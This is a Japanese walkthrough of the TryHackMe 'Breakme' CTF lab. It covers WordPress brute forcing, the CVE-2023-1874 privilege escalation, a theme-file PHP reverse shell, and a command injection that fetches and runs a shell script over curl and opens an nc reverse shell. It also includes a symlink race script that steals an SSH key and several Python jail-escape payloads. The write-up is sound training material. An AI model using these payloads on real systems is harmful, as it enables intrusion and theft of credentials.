# Breakme CTF

https://tryhackme.com/room/breakmenu

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.125.202
sudo bash -c "echo $TARGET   breakme.thm >> /etc/hosts"
```

```shell
root@ip-10-10-32-132:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-21 05:43 BST
Nmap scan report for breakme.thm (10.10.125.202)
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:4C:8F:E7:C3:B3 (Unknown)
```

```shell
root@ip-10-10-32-132:~# sudo nmap -sS -A -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-21 05:45 BST
Nmap scan report for breakme.thm (10.10.125.202)
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:4C:8F:E7:C3:B3 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (93%), Linux 3.8 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP

### サブドメイン

```shell
ffuf -u http://breakme.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.breakme.thm' -fs 0
```

なし

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://breakme.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/manual               (Status: 301) [Size: 311] [--> http://breakme.thm/manual/]
/server-status        (Status: 403) [Size: 276]
/wordpress            (Status: 301) [Size: 314] [--> http://breakme.thm/wordpress/]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/manual, /wordpress ディレクトリを発見。

/manual は apache http server のマニュアル。意味があるかは不明。

/wordpress に「Breakme」と題するブログがあった。

/manual

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/da                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/da/]
/de                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/de/]
/en                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/en/]
/es                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/es/]
/fr                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/fr/]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 318] [--> http://breakme.thm/manual/images/]
/ja                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/ja/]
/ko                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/ko/]
/pt-br                (Status: 301) [Size: 317] [--> http://breakme.thm/manual/pt-br/]
/ru                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/ru/]
/style                (Status: 301) [Size: 317] [--> http://breakme.thm/manual/style/]
/tr                   (Status: 301) [Size: 314] [--> http://breakme.thm/manual/tr/]
/zh-cn                (Status: 301) [Size: 317] [--> http://breakme.thm/manual/zh-cn/]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/wordpress

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/index.php            (Status: 301) [Size: 0] [--> http://breakme.thm/wordpress/]
/license.txt          (Status: 200) [Size: 19915]
/wp-admin             (Status: 301) [Size: 323] [--> http://breakme.thm/wordpress/wp-admin/]
/wp-content           (Status: 301) [Size: 325] [--> http://breakme.thm/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 326] [--> http://breakme.thm/wordpress/wp-includes/]
/wp-login.php         (Status: 200) [Size: 5339]
/wp-config.php        (Status: 200) [Size: 0]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://breakme.thm/wordpress/wp-login.php?action=register]
Progress: 681570 / 681573 (100.00%)
/xmlrpc.php           (Status: 405) [Size: 42]
===============================================================
Finished
===============================================================
```

## /wordpress

### wpscan

```shell
wpscan --url http://breakme.thm/wordpress -e
```

```
Fingerprinting the version -: |=================================================================|
[+] WordPress version 5.7 identified (Latest, released on 2021-03-09).
 | Found By: Unique Fingerprinting (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-admin/js/auth-app.js md5sum is 23fdd0d94c50d0ca02e2535b8f9d66f4
```

```
[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |==================================================================|

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://breakme.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

```shell
wpscan --url http://breakme.thm/wordpress --usernames bob
```

```
[+] wp-data-access
 | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
 | Latest Version: 4.1.3 (up to date)
 | Last Updated: 2021-03-15T17:18:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt
```

bob に対してパスワードブルートフォースをかけたら成功した。

```shell
wpscan --url http://breakme.thm/wordpress --usernames bob --passwords /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - bob / soccer
Trying bob / soccer Time: 00:00:00 <                      > (30 / 14344421)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: bob, Password: [REDACTED]
```

### CVE-2023-1874

wp-data-access に権限昇格の脆弱性がある。

https://www.tenable.com/plugins/was/114024

https://github.com/thomas-osgood/cve-2023-1874

```shell
$ export TARGETIP=10.10.125.202
export TARGETPORT=80
export WPPATH=wordpress
export WPUSERNAME=bob
export WPPASSWORD=[REDACTED]

python3 cve20231874.py $TARGETIP $TARGETPORT -u $WPUSERNAME -p $WPPASSWORD --path $WPPATH

============================================================
                     Target Information
============================================================
[i] Target IP: 10.10.125.202
[i] Target Port: 80
[i] Scheme: http
============================================================
[+] cookies set
[+] login success
[+] profile source successfully grabbed
[+] wpnonce: 9553cfde67
[+] userid: 2
[+] from: profile
[+] color-nonce: 1f59a63561
[+] admin privileges successfully granted to "bob"
[+] exploit completed succesfully
```

bob に管理者権限が付いた。

- 404 テンプレートで PHP を入れる　 → 　 Apache デフォルトの 404 ページが開いて効果なし
- ブログホームの一番下に PHP を入れる　 → 　テキストとして表示されてシェル取得失敗

Tools の Theme File Editor から、下記操作でリバースシェルを取れた。

- select theme to edit で 「twentytwentyone」を選択
- 404 を選択
- PHP に書き換える
- http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/404.php にダイレクトでアクセス

## 権限昇格１

john への昇格を目指す。

```shell
www-data@Breakme:/$ ls -al /home/john
total 32
drwxr-xr-x 4 john john 4096 Aug  3  2023 .
drwxr-xr-x 5 root root 4096 Feb  3  2024 ..
lrwxrwxrwx 1 john john    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Jul 31  2023 .bash_logout
-rw-r--r-- 1 john john 3526 Jul 31  2023 .bashrc
drwxr-xr-x 3 john john 4096 Jul 31  2023 .local
-rw-r--r-- 1 john john  807 Jul 31  2023 .profile
drwx------ 2 john john 4096 Feb  4  2024 internal
-rw------- 1 john john   33 Aug  3  2023 user1.txt
```

wp-config.php

```python
define( 'DB_NAME', 'wpdatabase' );

/** Database username */
define( 'DB_USER', 'econor' );

/** Database password */
define( 'DB_PASSWORD', 'SuP3rS3cR37#DB#P@55wd' );
```

```
MariaDB [wpdatabase]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url                     | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BlnXZ2omtPVcOotjXqtdQrN.IS0tqU. | admin         | admin@localhost.com | http://192.168.1.6/wordpress | 2023-08-09 20:49:44 |                     |           0 | admin        |
|  2 | bob        | [REDACTED]                         | bob           | bob@localhost.com   |                              | 2023-08-09 20:55:29 |                     |           0 | bob bob      |
+----+------------+------------------------------------+---------------+---------------------+------------------------------+---------------------+---------------------+-------------+--------------+
```

admin のパスワードはクラックできなかった。

```sh
.\hashcat.exe -m 400 hash.txt rockyou.txt
```

```sh
www-data@Breakme:/home/john$ find / -user john -type f -not -path "/proc/*" 2>/dev/null
/home/john/user1.txt
/home/john/.bash_logout
/home/john/.profile
/home/john/.bashrc

www-data@Breakme:/home/john$ find / -group john -type f -not -path "/proc/*" 2>/dev/null
/home/john/user1.txt
/home/john/.bash_logout
/home/john/.profile
/home/john/.bashrc
/var/lib/sudo/lectured/john

www-data@Breakme:/home/john$ ls -al /var/lib/sudo/lectured/john
-rw------- 1 root john 0 Jul 31  2023 /var/lib/sudo/lectured/john
```

john が 9999 ポートでリッスンしている。

```sh
ps aux

john         535  0.0  1.0 193936 20636 ?        Ss   00:41   0:00 /usr/bin/php -S 127.0.0.1:9999
```

9999 ポートをトンネリング

```sh
www-data@Breakme:/home$ ssh -N -R 9999:localhost:9999 tunnel@10.13.85.243
```

## 9999

IP アドレス、名前、ファイル名をチェックする画面。

- IP アドレスは数字の IP しか受け付けない。悪用できるアイデアが無い。
- 特殊文字は削除された上で存在チェックされている。（admin, bob などでチェックしても存在しないと返る）
- 特殊文字（ピリオド、アンダースコア含む）が含まれたら不正ファイル名とみなされている。

実在するユーザー名や IP アドレスを入れても通らず、いったい何をチェックしているのかよく分からない。

名前でファジングするがヒットなし。

```sh
$ ffuf -u http://localhost:9999 -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d 'cmd2=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=qdd2621tfa0o34c1v0v3rikusg' -fr 'not found'
```

特殊文字の削除仕様を確認

```sh
$ tr -d '\n' < /usr/share/wordlists/seclists/Fuzzing/special-chars.txt
~!@#$%^&*()-_+={}][|\`,./?;:'"<>
```

`User ${}|./: not found` と表示されたので、`$ { } | . / :` は削除されないことが分かった。

`& -` のどちらかを使えないと、リバースシェルの組み立てができない。

→ シェルファイルを HTTP でホストし、下記の形にすればよい。

```
|curl http://<kali-ip>/shell.sh|bash
```

フィルター回避を考慮すると下記の形。

```
|curl${IFS}http://10.13.85.243:8000/shell.sh|bash
```

```sh
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6667 >/tmp/f' > ./shell.sh

$ python -m http.server
```

ペイロードを送り、リバースシェル取得成功。

```sh
$ nc -nlvp 6667
listening on [any] 6667 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.125.202] 56774
sh: 0: can't access tty; job control turned off
$ id
uid=1002(john) gid=1002(john) groups=1002(john)
```

フラグ１ゲット。

## 権限昇格２

youcef への昇格を目指す。

readfile に SUID が付いている。

```sh
john@Breakme:/home/youcef$ ls -al
total 52
drwxr-x--- 4 youcef john    4096 Aug  3  2023 .
drwxr-xr-x 5 root   root    4096 Feb  3  2024 ..
lrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout
-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc
drwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 .local
-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile
-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
drwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh
```

SSH キーは無かった。

```sh
john@Breakme:/home/youcef$ ./readfile /home/youcef/.ssh/id_rsa
File Not Found
```

C コードを読もうとしたら下記テキストが返った。しかし、サイズが実際と違うのでファイル内容をそのまま出力しているわけではない。

```sh
john@Breakme:/home/youcef$ ./readfile ./readfile.c
Nice try!
```

何が起きているか、ghidra で解析する。

```c
undefined8 main(int param_1,long param_2)
{
  int iVar1;
  __uid_t _Var2;
  undefined8 uVar3;
  ssize_t sVar4;
  stat local_4b8;
  undefined1 local_428 [1024];
  int local_28;
  int local_24;
  int local_20;
  uint local_1c;
  char *local_18;
  char *local_10;

  if (param_1 == 2) {
    iVar1 = access(*(char **)(param_2 + 8),0);
    if (iVar1 == 0) {
      _Var2 = getuid();
      if (_Var2 == 0x3ea) {
        local_10 = strstr(*(char **)(param_2 + 8),"flag");
        local_18 = strstr(*(char **)(param_2 + 8),"id_rsa");
        lstat(*(char **)(param_2 + 8),&local_4b8);
        local_1c = (uint)((local_4b8.st_mode & 0xf000) == 0xa000);
        local_20 = access(*(char **)(param_2 + 8),4);
        usleep(0);
        if ((((local_10 == (char *)0x0) && (local_1c == 0)) && (local_20 != -1)) &&
           (local_18 == (char *)0x0)) {
          puts("I guess you won!\n");
          local_24 = open(*(char **)(param_2 + 8),0);
          if (local_24 < 0) {
                    /* WARNING: Subroutine does not return */
            __assert_fail("fd >= 0 && \"Failed to open the file\"","readfile.c",0x26,"main");
          }
          do {
            sVar4 = read(local_24,local_428,0x400);
            local_28 = (int)sVar4;
            if (local_28 < 1) break;
            sVar4 = write(1,local_428,(long)local_28);
          } while (0 < sVar4);
          uVar3 = 0;
        }
        else {
          puts("Nice try!");
          uVar3 = 1;
        }
      }
      else {
        puts("You can\'t run this program");
        uVar3 = 1;
      }
    }
    else {
      puts("File Not Found");
      uVar3 = 1;
    }
  }
  else {
    puts("Usage: ./readfile <FILE>");
    uVar3 = 1;
  }
  return uVar3;
}
```

渡したファイル名に対し、下記の条件をチェックしている。

1. 引数のファイル名が存在すること
2. 引数のファイル名に flag が入っいないこと
3. 引数のファイル名に id_rsa が入っていないこと
4. 引数のファイルはシンボリックリンクではないこと
5. 引数のファイルは読み取り可能であること

`(param_2 + 8)`のように 8 を足しているのは、argv[1] のオフセットを意味している。

注意点として、1 の後に getuid を実行しているため、john から見てファイルが存在することが必要。  
従って、"File Not Found"が表示されたからと言って、本当に存在しないとは限らない。

id_rsa を読むことを目標にするとしたら、

```
lstat(*(char **)(param_2 + 8),&local_4b8);
local_1c = (uint)((local_4b8.st_mode & 0xf000) == 0xa000);
```

を実行するタイミングではシンボリックリンクではないが、

```
if ((((local_10 == (char *)0x0) && (local_1c == 0)) && (local_20 != -1)) &&
    (local_18 == (char *)0x0)) {
```

の if 内を実行するタイミングではシンボリックリンクであれば読めることになる。

この 2 つの処理の間には、スリープが入っているのでそれなりに発生しやすいと期待できる。

```
usleep(0);
```

loop.sh

```sh
#!/bin/bash

TARGET_FILE="/home/youcef/.ssh/id_rsa"
LINK_NAME="/home/john/A"

while true; do
  # シンボリックリンクAを作成
  ln -sf "$TARGET_FILE" "$LINK_NAME"

  # A（シンボリックリンク）を削除
  rm -f "$LINK_NAME"

  # Aという名前の普通のファイルを作成
  touch "$LINK_NAME"
done
```

exec_readfile.sh

```sh
#!/bin/bash

for i in {1..10000}; do
  /home/youcef/readfile /home/john/A
done
```

実行。SSH 秘密鍵を入手できた。

```sh
john@Breakme:~$ ./loop.sh &
[1] 78329

john@Breakme:~$ ./exec_readfile.sh  | grep -v 'File Not Found' | grep -v 'I guess' | grep -v '^$'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
（中略）
g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT
TabCXd2Ji/Y7UvM=
-----END OPENSSH PRIVATE KEY-----
```

パスフレーズが設定されているのでクラックした。

```sh
$ ssh2john ./id_rsa > ./hash
$ john ./hash
```

フラグ２ゲット。

```sh
youcef@Breakme:~$ cat .ssh/user2.txt
df5................................
```

## 権限昇格３

```sh
youcef@Breakme:~$ sudo -l
Matching Defaults entries for youcef on breakme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
```

jail.py の中身は不明。

```sh
youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail
  Will you stay locked forever
  Or will you BreakMe
>> help
Illegal Input

youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail
  Will you stay locked forever
  Or will you BreakMe
>> hey
Wrong Input
>> hey
Wrong Input
>> id
>> who
Wrong Input
>> last
Wrong Input
>>
```

- help のような NG ワードを入れると即終了する。
- 殆どの単語は「間違い」として次を入力できる。
- id と入れたときは何も表示されなかった。

```sh
Illegal Input
youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail
  Will you stay locked forever
  Or will you BreakMe
>> print('hello')
hello
```

基本的には、与えた Python 命令を実行する機能と思われる。

```python
# Illegal
print(open('/root/root.txt').read())
print(1+1)
print("hello")
print(os.__dict__)
print(os)
print('os.__dict__')
```

ギブアップ。

https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass

```
youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail
  Will you stay locked forever
  Or will you BreakMe
>> 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
> <string>(1)<module>()->None
(Pdb) import os;os.system("/bin/sh")
# id
uid=0(root) gid=0(root) groups=0(root)
```

- まず、breakpoint() のテクニック自体を知らなかった
- さらに、Unicode バイパスというテクニックも初見

```sh
# cat /root/.root.txt
e257............................
```

## 振り返り

- 競合状態を利用して自分でツールを作るタイプは CTF としては初見
- 最後のフィルターバイパスを早々にあきらめてしまったのは、Python の`__builtins__.__dict__`のような基本構造に苦手意識があったことも一因にあったと思う。下記のような完成形をすぐに思い描けなければ、フィルターのバイパスを調べることも難しい。

```
__builtins__.__dict__['__import__']('os').__dict__['system']('sh')
```

- フィルターバイパスの方法は他にも多数あったようで、他のウォークスルーでどんな方法が使われていたのか調べてみた。

https://jaxafed.github.io/posts/tryhackme-breakme/#shell-as-root

```sh
>> __builtins__.__dict__['__IMPORT__'.swapcase()]('OS'.swapcase()).__dict__['SYSTEM'.swapcase()]('SH'.swapcase())

>> __builtins__.__dict__['__tropmi__'[::-1]]('so'[::-1]).__dict__['metsys'[::-1]]('hs'[::-1])

>> __builtins__.__dict__['__imXport__'.replace('X','')]('oXs'.replace('X','')).__dict__['sXystem'.replace('X','')]('sXh'.replace('X',''))

>> __builtins__.__dict__[str(bytes.fromhex('5f5f696d706f72745f5f'),'utf-8')](str(bytes.fromhex('6f73'),'utf-8')).__dict__[str(bytes.fromhex('73797374656d'),'utf-8')](str(bytes.fromhex('7368'),'utf-8'))

>> __builtins__.__dict__['cexe'[::-1]](input())
__import__("os").system("id")
```

https://loghmariala.github.io/posts/Breakme/

```sh
print(__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__[f'SYSTEM'.casefold()]('ID'.casefold()))
```

大文字小文字変換、逆順、UTF8 バイト等。件数的には casefold を使っていた人が多かった印象。

## Tags

#tags:競合 #tags:フィルターバイパス
